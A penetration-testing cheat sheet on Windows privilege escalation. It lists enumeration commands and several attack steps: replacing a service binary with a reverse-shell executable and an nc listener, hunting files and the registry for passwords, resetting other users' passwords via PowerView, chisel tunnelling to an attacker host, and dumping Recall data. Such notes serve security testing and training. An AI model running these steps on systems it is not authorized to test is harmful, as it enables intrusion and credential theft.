# Windows Privilege Escalation



Privilege Escalation (PrivEsc) in Windows is a process that get the Administrator credential and login.

### Automation <a href="#automation" id="automation"></a>

We might be able to find vulnerabilities on target Windows machine with automation tools as below:

* [WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
* [wesng (Windows Exploit Suggester Next Generation)](https://github.com/bitsadmin/wesng)
* [PrivescCheck](https://github.com/itm4n/PrivescCheck)

### LOLBAS (Living Off the Land Binaries, Scripts and Libraries) <a href="#lolbas-living-off-the-land-binaries-scripts-and-libraries" id="lolbas-living-off-the-land-binaries-scripts-and-libraries"></a>

[LOLBAS](https://lolbas-project.github.io/) provides misuses tools and executables already in the Windows system. So check the website.

In addition, I've created the [LOLGEN](https://lolgen.hdks.org/) that generates Living Off The Land payload.

### OS Information <a href="#os-information" id="os-information"></a>

```
hostname
systeminfo
systeminfo | findstr "OS"
ver
[System.Environment]::OSVersion.Version

# Datetime
Get-Date
```

#### Find OS Vulnerabilities <a href="#find-os-vulnerabilities" id="find-os-vulnerabilities"></a>

After investigating the OS information, find the vulnerabilities of OS version.

### Interesting Information <a href="#interesting-information" id="interesting-information"></a>

```
# Current user
whoami
whoami /user
whoami /groups
whoami /priv
whoami /all
echo %username%

# List users
net user
net users
net user USERNAME
Get-LocalUser

# List groups
net group
net localgroup
# List users in specific group
net localgroup "Remote Management Users"

# List user home directories
Get-ChildItem C:\Users -Force

# Environment variables
SET
Get-ChildItem -Path Env:

# Network
ipconfig
ipconfig /all
route print
arp -A
Get-NetAdapter

# Firewall
netsh firewall show state
netsh firewall show config
netsh advfirewall show allprofiles

# PowerShell info
Get-Host
$Host
$PSVersionTable
# Display only the PowerShell version.
(Get-Host).Version
$Host.Version

# Web app folder
dir c:\inetpub\

# SQL server
dir c:\SQLServer\Logs
type c:\SQLServer\Logs\ERRORLOG.BAK

# Email
dir "C:\Users\<user>\AppData\Local\Microsoft\Outlook\"
dir "C:\Users\<user>\AppData\Local\Packages\"
dir "C:\Users\<user>\AppData\Roaming\Thudnerbird\Profiles\"
dir "C:\Program Files\hMailServer\Data\"
dir "C:\Program Files (x86)\hMailServer\Data\"

# DPAPI protected data (https://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi-protected-secrets)
dir -Force C:\Users\<user>\AppData\Local\Microsoft\Credentials\
dir -Force C:\Users\<user>\AppData\Roaming\Microsoft\Credentials\

# Check access control for a specific directory
Get-Acl C:\Users\Administrator
```

#### Find Vulnerable Privileges <a href="#find-vulnerable-privileges" id="find-vulnerable-privileges"></a>

When executing `whoami /priv` command and if current user has the following privileges, there is likely a privilege escalation vulnerability.

* **SeBackupPrivilege**:
  * We can [dump password hashes from registry hives](https://exploit-notes.hdks.org/exploit/windows/privilege-escalation/registry-keys/).
  * We can [read restricted files](https://exploit-notes.hdks.org/exploit/windows/privilege-escalation/sebackupprivilege/).
* **SeDebugPrivilege**:
  * We can [impersonate token for the `lsass.exe`, `winlogon.exe` and other processes](https://github.com/hideckies/malsrc/blob/cb6fbb36e85b52a6c35c743ea3c94728bf0b6dbc/PrivilegeEscalation/TokenManipulation/TokenTheft/TokenTheft.cpp#L63).
* **SeImpersonatePrivilege**:
  * We can use [LocalPotato techniques](https://exploit-notes.hdks.org/exploit/windows/privilege-escalation/localpotato/).
* **SeTakeOwnershipPrivilege**:
  * We can [read restricted files by taking ownership](https://github.com/dollarboysushil/oscp-cpts-notes/blob/main/windows-privilege-escalation/user-privileges/setakeownershipprivilege.md).

### Recent Files <a href="#recent-files" id="recent-files"></a>

1. Right-click on the Windows icon.
2. Click **Run**.
3. Type `recent`in the search form.

### Running Services <a href="#running-services" id="running-services"></a>

```
Get-Service | Where-Object {$_.Status -eq "Running"}
wmic service list
wmic service list | findstr "Backup"

# Enumerate processes in CSV format
wmic process get caption,executablepath,commandline,processid /format:csv
# Get users SID
wmic useraccount get name,sid
# Launch the hidden executable hiding within ADS
wmic process call create $(Resolve-Path .\file.exe:streamname)

# Processes and services
sc query state=all
tasklist /svc
Get-Process
ps

# Query the configuration info for a specified service
sc qc "example-service"
```

#### Override Service Executable <a href="#override-service-executable" id="override-service-executable"></a>

At first, check the service status and get the executable for the service.

```
# 1. List running services and find interesting service
tasklist
# or
Get-Process
# or
ps

# 2. Check status the service
sc qc "example-service"
# In the result, we can see the path of the executable which runs the service.
```

Now check if we have write access under the folder where the executable exists.

```
echo "test" > \path\to\service-folder\test.txt
dir \path\to\service-folder
```

If we could write arbitrary file under the service folder, we may be able to replace the executable file as below:

```
cp revshell.exe \path\to\service-folder\example-service.exe
```

For example, if we want to do reverse shell, we need to prepare a net listener on our local machine:

```
nc -lvnp 4444
```

Now restart the service on target machine:

```
sc stop "example-service"
sc start "example-service"
```

When the service restarts, our 'evil' executable is executed in stead of the original executable.\
After few seconds, we might be able to get the shell on local machine.

### Running Processes <a href="#running-processes" id="running-processes"></a>

```
# -a: All connections and ports
# -f: Display FQDN (Fully Qualified Domain Names)
# -o: Display the owning process ID associated with each connection
netstat -afo
# -n: Display address and port in numerical form (not resolve domain)
netstat -ano

tasklist
Get-Process
ps
# Exclude `svchost`
Get-Process | where {$_.ProcessName -notlike "svchost*"}

# Display only `LISTENING` processes
netstat -afo | Select-String -Pattern "LISTENING"
```

### Histories <a href="#histories" id="histories"></a>

#### Command History in PowerShell Console <a href="#command-history-in-powershell-console" id="command-history-in-powershell-console"></a>

```
type c:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

#### Web Browser Hidsotries <a href="#web-browser-hidsotries" id="web-browser-hidsotries"></a>

We might be able to find interesting information about users by checking histories of web browsers such as **Chrome**, **Microsoft Edge**, **Internet Explorer**, etc.

### VSS (Volume Shadow Copy Service) <a href="#vss-volume-shadow-copy-service" id="vss-volume-shadow-copy-service"></a>

VSS coordinates the actions that are required to create a consistent a shadow copy (also known as a snapshot or a point-in-time copy) of the data that is to be backed up.

```
vssadmin list shadows
vssadmin list volumes
```

### Registry Keys <a href="#registry-keys" id="registry-keys"></a>

We may be able to retrieve sensitive information in registry hives.\
See also: [Windows PrivEsc with Registry Keys](https://exploit-notes.hdks.org/exploit/windows/privilege-escalation/registry-keys/)

```
# List all subkeys of a registry key
Get-ChildItem -Path HKCU:\ | Select-Object Name
# -Recurse: List recursively
Get-ChildItem -Path HKCU:\System -Recurse | Select-Object Name

# Search sensitive information in HKLM (HKEY_LOCAL_MACHINE)
# /f password: Specifies the keyword 'password' to search.
# /t REG_SZ: Specifies REG_SZ (string) type to search.
# /s: Specifies to query all subkeys and value names recursively.
reg query HKLM /f password /t REG_SZ /s
```

### Sensitive Information <a href="#sensitive-information" id="sensitive-information"></a>

```
# /s: Searches the current directory and all subdirectories.
# /i: Ignores the case of the characters.
findstr /si password *.txt *.xml *.ini
findstr /si password c:\Users\Administrator\*.txt
findstr /si cred *.txt *.xml *.ini
findstr /si cred c:\Users\Administrator\*.txt

# /p: Skips files with non-printable characters.
# /n: Prints the line number of each line that matches.
findstr /spin "password" *.*
findstr /spin "password" c:\Users\Administrator\*

cmd /c dir /s/b C:\*password*
cmd /c dir /s/b C:\*cred*
cmd /c dir /s/b C:\*.txt

# List files
# /a: Displays only the names of those directories and files.
dir /a \Users\Administrator\Desktop
# /s: Lists every oncurrece of the specified file name within the specified directory and all subdirectories.
dir /s *pass* == *cred* == *vnc* == *.config*
# /q: Displays the ownership information.
dir /q \Users\Administrator\Desktop

# Hidden files
dir /a:h .\

# Get contents of file
more .\example.txt
type .\example.txt

# Check Recycle.bin and SID Folder
dir -Force \'$Recycle.Bin'
# -Recurse: List files recursively
dir -Force -Recurse \'$Recycle.Bin'

# ManageEngine (this service has many vulnerabilities)
dir -Force \'Program Files (x86)'\ManageEngine\
```

#### Find Interesting Files <a href="#find-interesting-files" id="find-interesting-files"></a>

```
Get-ChildItem -Path c:\\ -Filter "*.txt" -Recurse 2>$null
# Directories
Get-ChildItem -Path c:\\ -Directory -Filter "Example" -Recurse 2>$null
```

#### Find Interesting Information in Files <a href="#find-interesting-information-in-files" id="find-interesting-information-in-files"></a>

```
Get-ChildItem -Path c:\inetpub -Recurse | Select-String -Pattern "password"
```

#### Collect Emails <a href="#collect-emails" id="collect-emails"></a>

Reference: [Atomic Rea Team](https://atomicredteam.io/collection/T1114.001/)

We can collect the information about emails such as **Outlook** on the following directories.

```
C:\Users\<username>\Documents\Outlook Files
C:\Users\<username>\AppData\Local\Microsoft\Outlook
```

### Open Ports <a href="#open-ports" id="open-ports"></a>

```
netstat -a
```

If we found the listening ports, we need to port forwarding to access the port in local machine.\
For example, assume the port 8000 is listening. We can access to the target port 8000 by accessing to `http://localhost:8000` in local by executing the following command.

```
# Remote (target) machine
chisel.exe client 10.0.0.1:9999 R:8000:127.0.0.1:8000

# Local (attacker) machine
chisel server --reverse -p 9999
```

Please refer to [this page](https://exploit-notes.hdks.org/exploit/network/port-forwarding/chisel/) to check how to use Chisel for port forwarding.

### Getting All Local Users/Groups <a href="#getting-all-local-usersgroups" id="getting-all-local-usersgroups"></a>

We can find all local users in **Computer Management** utility. To open, enter **"computer management"** in search form at the bottom of the windows screen.

In Computer Management, click **"Local Users and Groups"**.

#### Enumerate Users <a href="#enumerate-users" id="enumerate-users"></a>

1. Click **"Users"**.
2. Double-click each user to get details e.g. **"Member Of"**.

#### Enumerate Groups <a href="#enumerate-groups" id="enumerate-groups"></a>

1. Click **"Groups"**.
2. Double-click each group.
3. Attempt to add new user in the group because we might be able to do that even if we are not an administrator.

### Set New Password for Existing User <a href="#set-new-password-for-existing-user" id="set-new-password-for-existing-user"></a>

Using **PowerView**, we may be able to set new password for existing user.

```
# 1. Activate PowerView
Import-Module .\PowerView.ps1
. .\PowerView.ps1

# 2. Set new password
$Username = "John"
$Password = ConvertTo-SecureString 'Password@123' -AsPlainText -Force
Set-DomainUserPassword -Identity $Username -AccountPassword $Password
```

### Change Another User Password <a href="#change-another-user-password" id="change-another-user-password"></a>

If current user has `GenericAll` permission to another user, we can change the user password as below:

```
net user <another_user> <new_password> /domain
```

Then if the another user belongs to the `Remote Management Users` group or the `Administrators` group, we can login as the user with `evil-winrm` command.

### Change File Permission <a href="#change-file-permission" id="change-file-permission"></a>

#### From Command-Line <a href="#from-command-line" id="from-command-line"></a>

Check the current permission:

```
icacls 'C:\Path\to\file'
```

And change permission:

```
icacls 'C:\Path\to\file' /grant Users:F
icacls 'C:\Path\to\file' /grant Everyone:F
```

#### From GUI <a href="#from-gui" id="from-gui"></a>

1. Right-click on the file.
2. Select the **Properties**.
3. Click the **Security** tab.
4. Click **“Advanced”**.
5. In the **Permissions** tab, click the **“Add”**.
6. Click **“Select a principal”**.
7. Enter the username in the text field.
8. Click **OK** and **Apply**.

### Take Ownership of a File (Administrators Group Required) <a href="#take-ownership-of-a-file-administrators-group-required" id="take-ownership-of-a-file-administrators-group-required"></a>

```
# Check if the current user belongs to the Administrators group. 
net user USERNAME

# Move to the directory containing the desired file
cd \Users\Administrator\Desktop

# Enable an administrator to recover access to a file.
# /R: recursive operation
# /F: specify the filename
takeown /r /f *.*

# Modify dictionary access control lists on specified files
# /q: suppress success message
# /c: continue the operation despite any file errors
# /t: perform the operation on all specified files
# /grant: grant specified user access rights
icacls "example.txt" /q /c /t /grant Users:F
```

### All Privs for Local Service, Network Service Account <a href="#all-privs-for-local-service-network-service-account" id="all-privs-for-local-service-network-service-account"></a>

If we’re `Local Service` or `Network Service` account, it maybe possible to grant all privileges to the account.

[FullPowers](https://github.com/itm4n/FullPowers) is a powerful tool for doing that.

```
FullPower

# Confirm if the account has all privileges
whoami /priv
```

### PowerView <a href="#powerview" id="powerview"></a>

We can use Python version of PowerView (https://github.com/aniqfakhrul/powerview.py).

```
powerview example.local/username:password@<target-ip>
```

After logged in, we can leverages its power as below:

```
## Enumeration
# List domain users
Get-NetUser | select cn
# List domain groups
Get-NetGroup -GroupName *admin*
# Get shared folders
Invoke-ShareFinder
# Get operating systems running
Get-NetComputer -fulldata | select operatingsystem
# Find files or directories
Get-ChildItem -r -Filter "*.txt" -Name

## Shadow Credentials
# Get object SID for the user
Get-DomainUser -Identity <user> -Select ObjectSid
# Get ACL for the user with the object SID
Get-DomainObjectAcl -ResolveGUIDs -SecurityIdentifier <SID>
# Set owner to the target user
Set-DomainObjectOwner -TargetIdentity <target-user> -PrincipalIdentity <user>
# Add rights to the target user
Add-DomainObjectAcl -TargetIdentity <target-user> -PrincipalIdentity <user> -Rights fullcontrol

## Change another user password
$Username = "John"
$Password = ConvertTo-SecureString 'Password@123' -AsPlainText -Force
Set-DomainUserPassword -Identity $Username -AccountPassword $Password
```

### Sysinternals <a href="#sysinternals" id="sysinternals"></a>

Tools that offer technical resources and utilities to manage, diagnose, troubleshoot, and monitor a Microsoft Windows environment.

```
# Autoruns
# It shows what programs are configured to run during system bootup or login.
autoruns.exe

# Process Explorer
# A freeware task manager and system monitor.
procexp.exe
procexp64.exe

# Process Monitor
# It monitors and displays in real-time all file system activity.
procmon.exe
procmon64.exe

# Strings
# It is same as the Linux “strings” command.
strings.exe example.exe | findstr "sometext"
strings64.exe example.exe | findstr "sometext"
```

### Dump Sensitive Data from Recall <a href="#dump-sensitive-data-from-recall" id="dump-sensitive-data-from-recall"></a>

\*I'm interested with that, but I've not test yet.

Tool: [TotalRecall](https://github.com/xaitax/TotalRecall)

```
dir C:\Users\<username>\AppData\Local\CoreAIPlatform.00\UKP\<GUID>
```

We can extract sensitive information with https://github.com/xaitax/TotalRecall.

```
totalrecall.py --search password --from_date 2024-06-04 --to_date 2024-06-05
```

### References <a href="#references" id="references"></a>

* [HackTricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
* [Microsoft Learn](https://learn.microsoft.com/en-us/powershell/scripting/samples/working-with-registry-keys?view=powershell-7.3)
